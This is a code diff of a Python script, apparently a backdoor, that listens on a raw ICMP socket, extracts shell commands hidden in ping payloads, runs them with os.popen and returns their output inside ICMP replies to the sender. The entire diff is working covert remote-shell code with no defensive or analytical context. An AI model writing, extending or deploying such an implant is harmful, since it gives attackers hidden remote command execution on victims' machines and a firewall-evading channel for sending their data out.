@@ -50,58 +50,59 @@ def receive(ip_layer):
     # header = (_type,code,checksum,identifier,sequence) \
     data = icmp[17:]
     length = len(data)+1
-    header = struct.unpack('!BBHHHd'+str(length)+'p',icmp)
+    header = struct.unpack('!BBHHHd'+str(length) +'p',icmp)
 
+    #data = icmp[17:]
     cmd = str(data.decode('utf-8')).split(b'\x00'.decode('utf-8'),1)[0]
 
     return header,cmd
 
-def exec(cmd):
-    #result = os.system(cmd)    # os.system 返回值是脚本的退出状态码
-    r = os.popen(cmd)   # 返回值是脚本执行过程中的输出内容,是一个文件对象
-    result = r.readlines()
-
 def main():
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    #sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    #sock.bind((host, 0))
+    #local = socket.gethostname()
+    #sock.connect((local,0))
+    #sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    if os.name == "nt":
+        sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
+
     while 1:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        #sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        #host = '192.168.66.1'
-        #sock.bind((host, 0))
-        #sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        local=socket.gethostname()
-        sock.connect((local,0))
-
-        if os.name != "nt":
-            sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
-
-
         ip_layer,(src_ip,_) = sock.recvfrom(2048)
         header,cmd = receive(ip_layer)
         host = src_ip
-        print(host)
+        print('host:',host)
 
         print(cmd)
         # exit?
-
+        result = 'error'
         try:
-            result = exec(cmd)
+            #result = os.system(cmd)
+            result = os.popen(cmd).read()
             print(result)
         except:
             pass
 
-        _type = header[0]
-        print(_type)
+        _type = 8
+        if header[0]:
+            _type = 0
+
         code = header[1]
         checksum =1
         identifier = header[3]
-        sequence = header[4] +1
+        sequence = header[4]
 
-        icmp = pack_icmp(_type, code, checksum, identifier, sequence, 'result'.encode('utf-8'))
+        icmp = pack_icmp(_type, code, checksum, identifier, sequence, result.encode('utf-8'))
         #identifier = identifier * (identifier + 1) % 4096
-        len = sock.sendto(icmp,(host,0))
-        print('len:',len)
+        print('icmp: \n',icmp)
+        try:
+            i=sock.sendto(icmp, (host,0))
+            print(i)
+        except:
+            pass
 
-        print(src_ip)
+       # print(src_ip)
 
 
 
